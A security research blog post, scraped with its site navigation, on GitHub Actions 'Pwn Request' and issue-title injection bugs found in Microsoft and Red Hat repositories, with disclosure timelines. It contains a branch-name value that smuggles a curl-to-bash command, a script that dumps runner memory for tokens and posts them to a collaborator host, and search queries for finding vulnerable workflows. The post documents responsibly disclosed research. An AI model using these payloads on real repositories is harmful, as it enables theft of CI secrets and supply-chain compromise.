---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-09-26_long-live-the-pwn-request-hacking-microsoft-github-repositories-and-more.md
original_filename: 2023-09-26_long-live-the-pwn-request-hacking-microsoft-github-repositories-and-more.md
title: 'Long Live the Pwn Request: Hacking Microsoft GitHub Repositories and More'
category: documents
detected_topics:
- supply-chain
- sqli
- command-injection
- otp
- automation-abuse
- information-disclosure
tags:
- imported
- documents
- supply-chain
- sqli
- command-injection
- otp
- automation-abuse
- information-disclosure
language: en
raw_sha256: 9c1da00aa2fedd02ec885951eaf899043a5469ad136162ed4c3d4eb48cda4b24
text_sha256: c591d3a9a9f69239fc878912213776012be6dda44bfa44e4dc5aeda0de1e237d
ingested_at: '2026-06-28T07:32:26Z'
sensitivity: unknown
redactions_applied: false
---

# Long Live the Pwn Request: Hacking Microsoft GitHub Repositories and More

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-09-26_long-live-the-pwn-request-hacking-microsoft-github-repositories-and-more.md
- Source Type: markdown
- Detected Topics: supply-chain, sqli, command-injection, otp, automation-abuse, information-disclosure
- Ingested At: 2026-06-28T07:32:26Z
- Redactions Applied: False
- Raw SHA256: `9c1da00aa2fedd02ec885951eaf899043a5469ad136162ed4c3d4eb48cda4b24`
- Text SHA256: `c591d3a9a9f69239fc878912213776012be6dda44bfa44e4dc5aeda0de1e237d`


## Content

---
title: "Long Live the Pwn Request: Hacking Microsoft GitHub Repositories and More"
page_title: "Long Live the Pwn Request: Hacking Microsoft GitHub Repositories and More | Praetorian"
url: "https://www.praetorian.com/blog/pwn-request-hacking-microsoft-github-repositories-and-more/"
final_url: "https://www.praetorian.com/blog/pwn-request-hacking-microsoft-github-repositories-and-more/"
authors: ["Adnan Khan (@adnanthekhan)"]
programs: ["Microsoft", "Red Hat"]
bugs: ["CI/CD", "Pwn Request"]
publication_date: "2023-09-26"
added_date: "2023-09-27"
source: "pentester.land/writeups.json"
original_index: 742
---

Skip to content

**Meet Constantine – Find Mythos-level vulnerabilities in your code. It proves them, patches them, PRs them back. Autonomously.**

[ Download Datasheet ](/resources/constantine-datasheet/)

[ ![Praetorian](https://www.praetorian.com/wp-content/uploads/2025/10/praetorian-logo-final-white.svg) ](https://www.praetorian.com)

  * Platform  Close Platform Open Platform

#### [Praetorian Guard Platform](/guard/)

  * [Adversarial Exposure Validation](https://www.praetorian.com/guard/breach-attack-simulation/)
  * [Attack Surface Management](https://www.praetorian.com/guard/attack-surface-management/)
  * [Continuous Penetration Testing](https://www.praetorian.com/guard/continuous-penetration-testing/)
  * [Continuous Threat Exposure Management](https://www.praetorian.com/guard/continuous-threat-exposure-management/)
  * [Cyber Threat Intelligence](https://www.praetorian.com/guard/threat-intelligence/)
  * [Unified Vulnerability Management](https://www.praetorian.com/guard/vulnerability-management/)
  * [Adversarial Exposure Validation](https://www.praetorian.com/guard/breach-attack-simulation/)
  * [Attack Surface Management](https://www.praetorian.com/guard/attack-surface-management/)
  * [Continuous Penetration Testing](https://www.praetorian.com/guard/continuous-penetration-testing/)
  * [Continuous Threat Exposure Management](https://www.praetorian.com/guard/continuous-threat-exposure-management/)
  * [Cyber Threat Intelligence](https://www.praetorian.com/guard/threat-intelligence/)
  * [Unified Vulnerability Management](https://www.praetorian.com/guard/vulnerability-management/)

  * Services  Close Services Open Services

#### [Penetration Testing Services](/penetration-testing/)

  * [LLM Penetration Testing](https://www.praetorian.com/services/ai-ml-penetration-testing/)
  * [Application Penetration Testing](https://www.praetorian.com/services/application-penetration-testing/)
  * [Automotive Penetration Testing](https://www.praetorian.com/services/automotive-penetration-testing/)
  * [Cloud Penetration Testing](https://www.praetorian.com/services/cloud-penetration-testing/)
  * [IoT Penetration Testing](https://www.praetorian.com/services/iot-penetration-testing/)
  * [Network Penetration Testing](https://www.praetorian.com/services/network-penetration-testing/)
  * [LLM Penetration Testing](https://www.praetorian.com/services/ai-ml-penetration-testing/)
  * [Application Penetration Testing](https://www.praetorian.com/services/application-penetration-testing/)
  * [Automotive Penetration Testing](https://www.praetorian.com/services/automotive-penetration-testing/)
  * [Cloud Penetration Testing](https://www.praetorian.com/services/cloud-penetration-testing/)
  * [IoT Penetration Testing](https://www.praetorian.com/services/iot-penetration-testing/)
  * [Network Penetration Testing](https://www.praetorian.com/services/network-penetration-testing/)

#### [Advanced Offensive Security](/advanced-penetration-testing/)

  * [Assumed Breached](https://www.praetorian.com/services/assumed-breached-exercise/)
  * [Attack Path Mapping](https://www.praetorian.com/guard/attack-path-mapping/)
  * [CI/CD Attack Chains](https://www.praetorian.com/services/ci-cd-security-engagement/)
  * [Purple Team](https://www.praetorian.com/services/purple-team/)
  * [Red Team](https://www.praetorian.com/services/red-team/)
  * [Assumed Breached](https://www.praetorian.com/services/assumed-breached-exercise/)
  * [Attack Path Mapping](https://www.praetorian.com/guard/attack-path-mapping/)
  * [CI/CD Attack Chains](https://www.praetorian.com/services/ci-cd-security-engagement/)
  * [Purple Team](https://www.praetorian.com/services/purple-team/)
  * [Red Team](https://www.praetorian.com/services/red-team/)

#### [Continuous Offensive Security](/guard/)

  * [Adversarial Exposure Validation](https://www.praetorian.com/guard/breach-attack-simulation/)
  * [Attack Surface Management](https://www.praetorian.com/guard/attack-surface-management/)
  * [Continuous Penetration Testing](https://www.praetorian.com/guard/continuous-penetration-testing/)
  * [Continuous Threat Exposure Management](https://www.praetorian.com/guard/continuous-threat-exposure-management/)
  * [Cyber Threat Intelligence](https://www.praetorian.com/guard/threat-intelligence/)
  * [Unified Vulnerability Management](https://www.praetorian.com/guard/vulnerability-management/)
  * [Adversarial Exposure Validation](https://www.praetorian.com/guard/breach-attack-simulation/)
  * [Attack Surface Management](https://www.praetorian.com/guard/attack-surface-management/)
  * [Continuous Penetration Testing](https://www.praetorian.com/guard/continuous-penetration-testing/)
  * [Continuous Threat Exposure Management](https://www.praetorian.com/guard/continuous-threat-exposure-management/)
  * [Cyber Threat Intelligence](https://www.praetorian.com/guard/threat-intelligence/)
  * [Unified Vulnerability Management](https://www.praetorian.com/guard/vulnerability-management/)

  * Why Praetorian  Close Why Praetorian Open Why Praetorian

#### [Customer Case Studies](/customer-success-in-cybersecurity/)

  * [21st Century Fox](https://www.praetorian.com/customer-success-in-cybersecurity/21st-century-fox/)
  * [Cushman & Wakefield](https://www.praetorian.com/customer-success-in-cybersecurity/cushman-wakefield/)
  * [Bookings Holdings](https://www.praetorian.com/customer-success-in-cybersecurity/cybersecurity-partnership-bookings-holdings/)
  * [Nielsen](https://www.praetorian.com/customer-success-in-cybersecurity/nielsen/)
  * [OpenTable](https://www.praetorian.com/customer-success-in-cybersecurity/open-table/)
  * [Priceline](https://www.praetorian.com/customer-success-in-cybersecurity/priceline/)
  * [Samsung](https://www.praetorian.com/customer-success-in-cybersecurity/samsung-electronics/)
  * [X](https://www.praetorian.com/customer-success-in-cybersecurity/x-twitter/)
  * [Zoom](https://www.praetorian.com/customer-success-in-cybersecurity/zoom-2/)
  * [See All Customers](https://www.praetorian.com/customer-success-in-cybersecurity/)
  * [21st Century Fox](https://www.praetorian.com/customer-success-in-cybersecurity/21st-century-fox/)
  * [Cushman & Wakefield](https://www.praetorian.com/customer-success-in-cybersecurity/cushman-wakefield/)
  * [Bookings Holdings](https://www.praetorian.com/customer-success-in-cybersecurity/cybersecurity-partnership-bookings-holdings/)
  * [Nielsen](https://www.praetorian.com/customer-success-in-cybersecurity/nielsen/)
  * [OpenTable](https://www.praetorian.com/customer-success-in-cybersecurity/open-table/)
  * [Priceline](https://www.praetorian.com/customer-success-in-cybersecurity/priceline/)
  * [Samsung](https://www.praetorian.com/customer-success-in-cybersecurity/samsung-electronics/)
  * [X](https://www.praetorian.com/customer-success-in-cybersecurity/x-twitter/)
  * [Zoom](https://www.praetorian.com/customer-success-in-cybersecurity/zoom-2/)
  * [See All Customers](https://www.praetorian.com/customer-success-in-cybersecurity/)

#### Resources

  * [Security Blog](https://www.praetorian.com/blog/)
  * [Resource Library](https://www.praetorian.com/resources/)
  * [Security 101](/security-101/)
  * [Labs](https://www.praetorian.com/praetorian-labs/)
  * [GitHub](https://github.com/praetorian-inc/)
  * [MITRE ATT&CK](https://www.praetorian.com/mitre-attack/)
  * [Speaking and Events](https://www.praetorian.com/speaking-and-events/)
  * [Warlocks](https://wherewarlocksstayuplate.com/)
  * [Security Blog](https://www.praetorian.com/blog/)
  * [Resource Library](https://www.praetorian.com/resources/)
  * [Security 101](/security-101/)
  * [Labs](https://www.praetorian.com/praetorian-labs/)
  * [GitHub](https://github.com/praetorian-inc/)
  * [MITRE ATT&CK](https://www.praetorian.com/mitre-attack/)
  * [Speaking and Events](https://www.praetorian.com/speaking-and-events/)
  * [Warlocks](https://wherewarlocksstayuplate.com/)

#### Use Cases

  * [ASM for Healthcare](https://www.praetorian.com/guard/attack-surface-management-healthcare/)
  * [Bug Bounty Cost Reduction](https://www.praetorian.com/services/bug-bounty-cost-reduction/)
  * [FDA Testing and Monitoring](https://www.praetorian.com/services/fda-testing-monitoring/)
  * [Mergers and Acquisitions](https://www.praetorian.com/services/mergers-acquisitions/)
  * [Ransomware Prevention](https://www.praetorian.com/services/ransomware-prevention/)
  * [Rogue IT Identification](https://www.praetorian.com/services/rogue-it-identification/)
  * [Tool and Vendor Consolidation](https://www.praetorian.com/services/tool-vendor-consolidation/)
  * [Vendor Risk Management](https://www.praetorian.com/services/vendor-risk-management/)
  * [ASM for Healthcare](https://www.praetorian.com/guard/attack-surface-management-healthcare/)
  * [Bug Bounty Cost Reduction](https://www.praetorian.com/services/bug-bounty-cost-reduction/)
  * [FDA Testing and Monitoring](https://www.praetorian.com/services/fda-testing-monitoring/)
  * [Mergers and Acquisitions](https://www.praetorian.com/services/mergers-acquisitions/)
  * [Ransomware Prevention](https://www.praetorian.com/services/ransomware-prevention/)
  * [Rogue IT Identification](https://www.praetorian.com/services/rogue-it-identification/)
  * [Tool and Vendor Consolidation](https://www.praetorian.com/services/tool-vendor-consolidation/)
  * [Vendor Risk Management](https://www.praetorian.com/services/vendor-risk-management/)

  * About  Close About Open About

#### [About Praetorian](/praetorian-offensive-cybersecurity-company/)

  * [Overview](https://www.praetorian.com/about-us/)
  * [In the News](/news/news/)
  * [Press Releases](/news/press-release/)
  * [Contact Us](https://www.praetorian.com/contact-us/)
  * [Overview](https://www.praetorian.com/about-us/)
  * [In the News](/news/news/)
  * [Press Releases](/news/press-release/)
  * [Contact Us](https://www.praetorian.com/contact-us/)

#### [Join Praetorian](/careers/#job-opening)

  * [Culture](https://www.praetorian.com/work-at-praetorian/)
  * [People Ops Blog](/people-ops/)
  * [New Hire Survival Guide](/wp-content/uploads/2024/11/Praetorian-Survival-Guide.pdf)
  * [Tech Challenges​](https://www.praetorian.com/challenges/)
  * [Job Postings](https://www.praetorian.com/careers/#job-opening)
  * [Culture](https://www.praetorian.com/work-at-praetorian/)
  * [People Ops Blog](/people-ops/)
  * [New Hire Survival Guide](/wp-content/uploads/2024/11/Praetorian-Survival-Guide.pdf)
  * [Tech Challenges​](https://www.praetorian.com/challenges/)
  * [Job Postings](https://www.praetorian.com/careers/#job-opening)

  * [ Platform Demo  ](/praetorian-guard-demo/)

  * [ Contact Us  ](/contact-us/)

  * [Corporate Security](https://www.praetorian.com/category/corporate-security/), [Offensive Security](https://www.praetorian.com/category/offensive-security/)

# Long Live the Pwn Request: Hacking Microsoft GitHub Repositories and More

  * [Adnan Khan](https://www.praetorian.com/author/adnan-khan/)
  * [ September 26, 2023 ](https://www.praetorian.com/blog/2023/09/26/)

![](https://www.praetorian.com/wp-content/uploads/2024/06/PWN1.png)

Software supply chain attacks have been increasing both in frequency and severity in recent months. In response to these attacks, the CISA has even released a cybersecurity information sheet (CSI) on how organizations can secure their CI/CD pipelines. The introduction to the CSI states:

“(The) CSI explains how to integrate security best practices into typical software development and operations (DevOps) Continuous Integration/Continuous Delivery (CI/CD) environments, without regard for the specific tools being adapted, and leverages several forms of government guidance to collect and present proper security and privacy controls to harden CI/CD cloud deployments. As evidenced by increasing compromises over time, software supply chains and CI/CD environments are attractive targets for malicious cyber actors (MCAs).”

The scary part about these attacks is they might not be particularly hard to carry out or require sophisticated phishing campaigns against a developer. Conducting a supply chain attack that has far reaching impact might just be as easy as creating a single pull-request, or Pwn Request, on GitHub.

## Pwn Requests & Workflow Event Code Injection

Pwn Requests, as they are colloquially known, are an attack type that exploits a vulnerability where a repository runs a workflow on a pull_request_target trigger and proceeds to check out _and_ run code from the PR branch. Users have documented the vulnerability for years and GitHub’s documentation states in several places how developers should avoid it.

GitHub has, however, taken the following steps to reduce the impact of an attacker successfully exploiting Pwn Requests and Injection attacks:

  * GitHub Actions cannot modify workflow files OR merge pull requests that contain changes to workflow files.
  * By default, GitHub Actions cannot approve or merge Pull Requests.
  * Repositories created after Feb 2nd, 2023 contain a GitHub token with read-only permissions by default if the workflow does not specify permissions. 
  * If an organization was created prior to February 2nd, 2023, then the organization default setting will be to have a token with write access, and all new repositories will follow that setting.

Workflow event code injection also arises from developer error; however, the exploit manifests quite like textbook SQL injection from the 90s and 2000s.

Any workflow that runs a shell script and references externally controlled variables could be vulnerable to arbitrary code execution within the context of the default branch, as the simple example below shows.
  
  
  run: echo “${{ github.event.issue.title }}”
  
  

Some variables are useful for injection even if they do not seem like they would allow arbitrary code execution. A prime example is the **github.event.pull_request.head.ref** variable. An example of a less obvious injection case that is just as exploitable is the branch name from the pull request. Below is a simplified example of a vulnerable step:
  
  
  run: echo “PR Branch is: ${{ github.event.pull_request.head.ref }}”
  
  

An attacker could create a pull-request using a branch with the following name (yes, you read that correctly, the following is a git _branch name_):
  
  
  Hacked”${IFS}&&${IFS}{curl,-sSfL,gist.githubusercontent.com/BadUser/Hash/raw/inject.sh}${IFS}|${IFS}bash

When the workflow runs, the action will place a shell script containing the following within the runner’s ‘_temp’ directory. The script will then download a secondary payload from a gist and run it. The gist will contain the actual malicious actions, as we see here:
  
  
  echo “PR Branch is hacked”${IFS}&&${IFS}{curl,-sSfL,gist.githubusercontent.com/BadUser/Hash/raw/inject.sh}${IFS}|${IFS}bash
  
  

The ${IFS} (internal field separator) functions as whitespace. This is necessary because branch names cannot contain spaces.

The universal mitigation for script injection is to assign the actions variable to an environment variable, and then reference the environment variable in run steps.

## Finding Vulnerable Repositories

### Injection via Issue Title

The following [code search](https://github.com/search?type=code) query looks for workflow files that run on the issue or discussion trigger AND contain an ‘echo’ command followed by an Actions variable reference to the body, title, or comment of an issue or discussion.
  
  
  /echo.*\{\{\s*github.event.issue.(body|title|comment.title)\s*\}\}/ AND /on:\s*\n*(issue|discussion)/ lang:yaml path:/^.github\/workflows\// NOT is:fork
  
  

The resulting workflows aren’t guaranteed to be vulnerable; however, a quick manual check can confirm the result.

### Injection via PR Title/Body/Branch Name

The following [code search](https://github.com/search?type=code) query looks for workflow files that run on the pull_request_target trigger AND contain an ‘echo’ command followed by an Actions variable reference to a value that is under the control of the pull request creator and can contain arbitrary code.
  
  
  /echo.*\{\{\s*github.event.pull_request.(body|title|head.ref|head.label|head.repo.description|repo.homepage|head.repo.default_branch)\s*\}\}/ AND /on:\s*\n*pull_request_target/ lang:yaml path:/^.github\/workflows\// NOT is:fork
  
  

### Pwn Request

Pwn request vulnerabilities are the hardest ones to truly validate. The [SourceGraph](https://sourcegraph.com/search) query below identifies _potential_ repositories that will require manual analysis to confirm. To be vulnerable the repository needs **_all_** of the following attributes:

  * Check out code from PR branch
  * Run code from PR branch
  * No deployment environment/label based gating
  * GITHUB_TOKEN permissions set to write

  
  
  context:global (/\{\{\s*github.event.pull_request.(head.ref|head.sha|merge_commit_sha|head.repo.id|id|head.repo.full_name)\s*\}\}/ OR /refs\/pull\/\$\{\{\s*github.event.pull_request.number\s*\}\}\/merge/) AND /(pull_request_target:|pull_request_target\s*]|pull_request_target\s*")/ AND "actions/checkout" lang:yaml file:.github/workflows/
  
  

## microsoft/confidential-sidecar-containers

This repository also briefly contained a Pwn Request vulnerability. It appeared to hold code to build the containers for Azure’s Confidential computing feature.

<https://learn.microsoft.com/en-us/azure/container-instances/container-instances-confidential-overview>

A developer introduced the vulnerability shortly before I identified it, and the commit message stipulated that no security issue existed because workflows require approval for the repository (see figure 1). This assumption was wrong, however, because workflows that execute on **pull_request_target** do **_NOT_** require approval, even from first time contributors.

![](https://www.praetorian.com/wp-content/uploads/2024/06/PWN1-300x125.png)

_Figure 1: The commit message explaining why the repository permits credentials from fork PRs._

In order to prove the vulnerability, I executed an attack with the aim of stealing the repository’s Azure credentials. Based on previous experiences with reporting a previous Pwn Request vulnerability to MSRC, stealing secrets is imperative in order to irrefutably prove impact.

### Pwn Request Attack Planning

As with all Pwn Request attacks, the vulnerability existed because the repository checked out _and_ ran code from the pull request head branch. The first step was to trace code execution from the workflow file to files that originating from the pull request.

In the case of microsoft/confidential-sidecar-containers, this was a simple task. The push-encfs-image job within the **push_encfs_image.yml** file contained a step that ran docker/encfs/build.sh after checking out the pull request head. This meant that I could freely modify code in build.sh and use it to acquire the GITHUB_TOKEN and Azure secrets (see figure 2).

![](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20636%20577'%3E%3C/svg%3E)

_Figure 2: The vulnerable workflow checked out the PR head and then ran a script from it._

### Payload Preparation

The next step was to create a payload to obtain the GITHUB_TOKEN as well as the Azure secrets. I modified the build.sh file to contain several additional commands (see figure 3). The first command sent the output of all script files within the runner’s temp directory to a Burp collaborator URL. The second downloaded a script from a Gist I controlled.

![](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20626%20403'%3E%3C/svg%3E)

_Figure 3: Modified build.sh from PR head._

The script contained the following code:
  
  
  TOKEN_VAL=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | base64 | base64`
  
  curl -d "${TOKEN_VAL}" https://hteqcs87o4imuhax1ymecyf0brhi5atz.oastify.com
  
  sleep 60m
  
  

### Attack Execution

  1. Created a fork of the microsoft/confidential-sidecar-containers repository.
  2. Modified the docker/encfc/build.sh within my fork to contain the payload that would exfiltrate the Azure credentials along with the GITHUB_TOKEN and then sleep for a few minutes.
  3. Created a **draft** pull request from the forked repository (https://github.com/microsoft/archived-confidential-sidecar-containers/pull/52). Since the workflow ran on **pull_request_target,** execution was immediate and approval was **not** required (see figure 4).

![](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20591%20382'%3E%3C/svg%3E)

_Figure 4: Execution of workflow with modified build script._

4\. Received the Azure secrets and Base-64 encoded GITHUB_TOKEN at my Burp collaborator URL (see figures 5 and 6).

![](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20585%20281'%3E%3C/svg%3E)

_Figure 5: Script files from the runner’s _temp directory._

_ ![](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20595%20242'%3E%3C/svg%3E) _

_Figure 6 : Base-64 encoded GITHUB_TOKEN values from memory dumps._

5\. Used CyberChef to quickly decode the base64 encoded GITHUB_TOKEN and retrieved the plain-text ghs_ value (see figure 7).

![](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20587%20270'%3E%3C/svg%3E)

_Figure 7: Decoded GITHUB_TOKEN value._

##### GITHUB_TOKEN Abuse

In this repository, the GITHUB_TOKEN had default write permissions, so I used it to perform several benign actions to prove that I was able to exploit the vulnerability and cross a security boundary. The first step was to create a new feature branch that contained a README change, after which I created a new tag that pointed to a new commit in the feature branch (see figure 8).

![](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20578%20212'%3E%3C/svg%3E)

_Figure 8: Modified tag name._

##### Secrets Validation

After using the GITHUB_TOKEN to delete my workflows, I moved to validate the Azure credentials I had retrieved from the script files. The credentials provided write access to _two_ Azure container registry repositories (see figure 9).

![](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20631%20389'%3E%3C/svg%3E)

_Figure 9: Validation of Azure Container Registry credentials._

I did not attempt to assess further impact at this point. During MSRC pre-disclosure review of this blog post, Microsoft stated that the Azure credentials were only relevant for CI purposes and the container repositories were not used for production containers.

### Response

Since the testing was very overt, the code owner of the repository actually sent me an email asking if this was part of some kind of penetration test. I informed him that it was not, and that it was overt testing performed under Microsoft’s safe harbor. Thankfully, I was able to point him to the MSRC submissions for this vulnerability, which significantly expedited the review process.

Microsoft quickly rotated the Azure credentials to fix the vulnerability. Additionally, Microsoft decided to create a new repository from a commit prior to the exploit and archived the old one to ensure the repository retained no long-term effects of the exploit. The [old archived repository](https://github.com/microsoft/archived-confidential-sidecar-containers/tags) contains the results of my overt testing (see figure 10).

![](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20641%20327'%3E%3C/svg%3E)

_Figure 10: The results of this exploit in the old, archived repository._

### Disclosure Timeline

**July 16, 2023** – Submitted MSRC Report

**July 17, 2023** – Status Changed to Review / Repro

**July 20, 2023** – Status Changed to Develop

**August 2, 2023** – Status Changed to Complete

**August 28, 2023** – Informed MSRC of intent to disclose details in two weeks

**August 30, 2023** – Provided blog draft for review to MSRC

**Sept 6, 2023** – Received comments from MSRC, updated the blog post in response to their comments.

## microsoft/gpt-review

I separately discovered and reported a vulnerability within a GitHub Action maintained by Microsoft. This particular action was unique in that it utilized ChatGPT to automatically review pull requests. The repository hosting the action also happened to be vulnerable to a “Pwn Request” attack. As with the other repository in this post, it contains a workflow that runs on the pull_request_target trigger but also happens to check out _and_ execute code from the pull request head branch.

Using this vulnerability, I was able to prove that an attacker could push a malicious release to the **Microsoft/gpt-review** repository so that any users of this action would be running malicious code in their CI/CD pipelines. The impact of this Pwn Request vulnerability could range from source code disclosure all the way to a complete takeover of cloud infrastructure.****

### Attacking Microsoft/gpt-review

The gpt-review action was vulnerable because it contained a workflow that ran on the **pull_request_target** trigger and proceeded to check out and run the code from the PR head (see figure 11).

![](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20617%20502'%3E%3C/svg%3E)

_Figure 11: Vulnerable gpt-review workflow._

The specific injection point was into the Python code of the action. The workflow installed the code using ‘pip install .’ – from the local directory – and then ran the application (see figure 12). To execute arbitrary code within the action, all I needed to do was modify the Python code.

![](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20612%20729'%3E%3C/svg%3E)

_Figure 12: Installation of Python code from working directory._

Since the workflow used a GITHUB_TOKEN with full write permissions, I demonstrated the vulnerability by carrying out the following steps (see figures 13 and 14):

  * Created a new feature branch within the repository named **msrc_testing_branch**
  * Modified the release title by appending ‘-**MSRC SECTEST’**

![](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20612%20349'%3E%3C/svg%3E)

_Figure 13: Creation of feature branch in Microsoft/gpt-review repository._

_ ![](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20615%20404'%3E%3C/svg%3E) _

_Figure 14: Modified release title._

### What could the impact have been?

Being able to modify a release title on a Microsoft repository is cool, but what could the impact have been? If I wanted to be evil, how could I have utilized this Pwn Request vulnerability to carry out a damaging attack against both Microsoft and those who are utilizing the gpt-review repository.

#### GitHub Action Dependency

Since microsoft/gpt-review is a GitHub Action, other repositories can utilize it as part of their own workflows. GitHub will conveniently list all other public repositories that depend on a specific GitHub Action. The largest repository here is microsoft/SynapseML (see figure 15).

![](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20628%20362'%3E%3C/svg%3E)

_Figure 15: Microsoft/SynapseML repository uses the vulnerable microsoft/gpt-review repository._

Diving deeper into SynapseML, you can see a workflow that automatically reviews PRs using the microsoft/gpt-review action. It also runs on the **pull_request_target** trigger AND references the gpt-review action by tag. GitHub tags layer on top of git tags. A tag is a reference to a specific commit sha. Tags can be changed by anyone with push access to a repository unless tag protection is enabled. To backdoor the action, all I would need to do is modify the action’s code to perform malicious actions, push those changes to a separate branch within gpt-review, and then force push the 0.9.4 tag to point to my commit. Now, instead of running the legitimate code attached to the 0.9.4 tag, anyone referencing **microsoft/[[email protected]](/cdn-cgi/l/email-protection)** will be running malicious code in their workflows (see figure 16).

![](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20630%20460'%3E%3C/svg%3E)

_Figure 16: Synapse ML uses a tagged version of gpt-review for PR reviews._

### Disclosure Timeline

**June 30, 2023 –** Sent Report to MSRC

**July 3, 2023 –** Report Marked as In Review/Repro

**July 11, 2023** – Followed up with a note stating that the vulnerability is still exploitable.

**July 12, 2023 –** Repository exploited by opportunistic bug bounty hunter

**July 12, 2023 –** Developer fixed vulnerability, most likely after seeing malicious PRs

**July 13, 2023 –** Test GitHub Account belonging to myself and other individual banned and pull requests deleted

**July 17, 2023 –** Received generic response from MSRC that everything is working as intended.

**July 26, 2023** **–** Received a notification that the case has been reopened.

**August 30, 2023** – Emailed MSRC asking if there is an update on the case and whether this is eligible for any bounty payments.

**August 30, 2023** – Received a response indicating that this had a **Severity: None** and **Security Impact: Not a Vulnerability**

**August 30, 2023** – Asked MSRC if I am free to blog about all the actions I carried out, given that this was “Not a Vulnerability” in their eyes. Submitted the entire blog post to MSRC under the Confidential Sidecar Containers case.

**Sept 6, 2023** – Received an update asking me to not publish this given that the vulnerability is “Important” and the engineering team is working on a fix. I responded stating that the vulnerability was no longer exploitable after the maintainer disabled the vulnerable workflow, and that the repository appeared to be in an abandoned state. I also stated to MSRC that I intended to disclose this, and that it is not reasonable to hold the vulnerability in Develop given that it is no longer exploitable, but I am happy to hold off if there is a true fix in development.

**Sept 11, 2023** – Received an update stating that the case is in Develop and that my intention to disclose has been communicated with the engineering team and that I am holding off until resolution.

**Sept 12, 2023** – Received another update confirming that the exploited pipelines were deleted shortly after reviewing my report and that the case is Resolved.****

The vulnerability disclosure process was unusual, but par for the course for reports submitted to MSRC. The initial designation that everything is working as Microsoft intended would mean that an unauthenticated actor modifying a Microsoft-owned GitHub Action that Microsoft has published in the actions marketplace is “working as intended.”

Malicious actors are more likely to exploit Microsoft online services because legitimate security researchers are too often told that their reports have no impact, despite overtly demonstrating impact and ability to cross security boundaries.

## redhat-performance/quads (and more!)

This vulnerability was due to issue title injection. Unlike a Pwn Request, where an attacker uses a malicious PR, issue injection happens when a workflow passes un-sanitized input from an issue workflow trigger event into code that is part of a ‘run’ step.

When a workflow runs, any scripts included as part of ‘run’ steps in GitHub Actions workflows are saved to the filesystem of the runner. This means that any variables within **‘${{ github.event.issue.title }}’** will be resolved by the GitHub Actions runner and _then_ saved to a script on the runner’s filesystem (see Figure 17).

![](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20593%20320'%3E%3C/svg%3E)

_Figure 17: Injection points in vulnerable workflow._

I reported this vulnerability to the maintainers and provided a fix. The maintainers were unaware that an attacker can steal the GITHUB_TOKEN even if it is not referenced (see exchange in figure 18).

![](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20594%20648'%3E%3C/svg%3E)

_Figure 18: A conversation demonstrating that the maintainers did not know their GITHUB Tokens were vulnerable despite not being referenced._

I offered to demonstrate this with their explicit permission, and the maintainers allowed me to test this vulnerability (see figure 19).

![](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20601%20409'%3E%3C/svg%3E)

_Figure 19: The maintainer granted me explicit permission to prove the vulnerability._

__ I followed up with a payload that downloaded and executed a shell script from a repository that I controlled. This payload dumped the memory from the runner process to extract the GITHUB_TOKEN. Since the token is valid for the duration of the build, I slept the process for a few minutes and used the token to make a benign change (see figure 20).

![](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20602%20371'%3E%3C/svg%3E)

_Figure 20: Using the token to make a benign change._

The maintainer’s response was overwhelmingly positive, and shortly after the maintenance team fixed the same vulnerability class in other repositories within the RedHat Performance organization.

## Pwn Requests: A Problem that Just Won’t Go Away

Members of the cybersecurity community have documented pull request target abuse for several years, beginning with an excellent three part write up by GitHub’s [Jaroslav Lobacevski](https://github.com/jarlob) on GitHub Actions security and several follow up blog posts by Cycode, and GitGuardian. Despite the extensive documentation on pwn requests, we have seen several large projects that are vulnerable to these attacks only months after introducing the pull request capability. This means that some engineers writing CI/CD workflows are not considering the risks of abuse when writing workflows.

Over the last few months Praetorian has reported repositories in several projects that were vulnerable to Pwn Requests or code injection via an issue or pull request title. Following are some of the most notable:

  * https://github.com/kata-containers/kata-containers
  * https://github.com/apache/doris
  * https://github.com/StarRocks/starrocks
  * https://github.com/ministryofjustice/hmpps-delius-api
  * https://github.com/redhat-performance/quads
  * https://github.com/intel/llvm
  * https://github.com/Azure/Enterprise-Scale
  * https://github.com/Checkmarx/kics

This means that GitHub needs to add a feature that makes workflows running under **pull_request_target** require approval by default for first time contributors if the workflow contains a **GITHUB_TOKEN** with write permissions. Many repositories have implemented this change by adding approval gating via labels or deployment environments.

### Who Will Watch the Watcher?

This vulnerability also poses a question for the future. As companies begin to leverage AI to perform routine tasks such as reviewing Pwn Requests (see figure 21), checking code changes for vulnerabilities and automatically running CI/CD, we must ask: What prevents these AI systems from themselves being backdoored by a threat actor? What would the impact be if a threat actor inserted themselves into the highly complex systems that are involved in training AI?

